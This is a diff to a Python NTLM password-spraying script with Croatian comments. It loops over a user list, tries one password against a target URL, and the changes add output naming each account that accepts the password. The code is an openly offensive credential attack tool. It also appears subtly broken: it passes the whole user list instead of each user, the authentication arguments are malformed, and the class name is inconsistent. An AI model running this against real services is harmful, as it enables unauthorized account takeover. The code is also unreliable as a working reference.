@@ -31,7 +31,7 @@ def main(argv):
 
     if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
         #Start attack
-        #sprayer = NTLMSprayer(fqdn)
+        #sprayer = NTLMSprayer(userfile,fqdn,password,attackurl)
         #Dodaj korisnike u array za sprayanje
         usersToAttack=[]
         lines = open(userfile, 'r').readlines()
@@ -75,5 +75,6 @@ class NTLMsprayer:
         for user in self.users:
             response=requests.get(self.attackurl,auth=HttpNtlmAuth(self.fqdn,"\\",self.users,self.password))
             if(response.status_code==200):
-                print("Prihvaceno")
-        
+                print("Prihvaceno za user: ",user ,"\nsa sifrom: ",self.password)
+            else:
+                print("Vas napad nije bio prihvacen za slucaj: ",user)
